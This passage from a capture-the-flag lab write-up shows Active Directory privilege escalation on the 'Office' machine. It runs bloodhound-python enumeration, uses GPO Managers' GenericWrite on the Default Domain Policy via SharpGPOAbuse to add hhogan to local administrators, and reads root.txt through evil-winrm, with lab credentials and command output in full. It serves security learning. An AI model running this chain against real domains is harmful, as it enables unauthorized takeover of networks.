Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\HHogan\Documents> whoami
office\hhogan
```

After grabing domain info with bloodhound-python (`❯ bloodhound-python -c All --use-ldaps -ns 10.10.11.3 -d office.htb -u tstark -p playboy69`), starting neo4j server (`❯ sudo neo4j console`), uploading the files to bloodhound, in Analysis > Find Shortest Paths to Domain Admins I can see that the group "GPO Managers" has GenericWrite privilege on the "Default Domain Policy":

![GPO Managers has GenericWrite in Default Domain Policy](/assets/images/Office/gpo-managers-GenericWrite-on-Default-Domain-Policy.png)

Also, user hhogan (which we have pwned) belongs to "GPO Managers":

```powershell
*Evil-WinRM* PS C:\Windows\Temp\privesc3> net user hhogan
<SNIP>

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users         *GPO Managers
The command completed successfully.
```

So I can use [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) to modify the Default Domain Policy and make the machine do one of various things like add rights to a user, add a user to local admins group or add a immediate computer task. In my case, I will add user hhogan to localadmins. But first, we have to build the SharpGPOAbuse project using a Windows 10 VM and Visual Studio (open the .sln file, and click on Compile > Compile solution). Once builded, execute this command in victim machine:

```powershell
*Evil-WinRM* PS C:\Windows\Temp\privesc3> .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount hhogan --GPOName "Default Domain Policy" --force
```

And you should belong to group Administrators:

```powershell
*Evil-WinRM* PS C:\Windows\Temp\privesc3> net user hhogan
<SNIP>
Local Group Memberships      *Administrators       *Remote Management Use
Global Group memberships     *Domain Users         *GPO Managers
The command completed successfully.
```

So you can now see root.txt in a new winrm session:

```powershell
❯ evil-winrm -i 10.10.11.3 -u hhogan -p 'H4ppyFtW183#'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\HHogan\Documents> cd \Users\Administrator\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
b1****************************a5
```
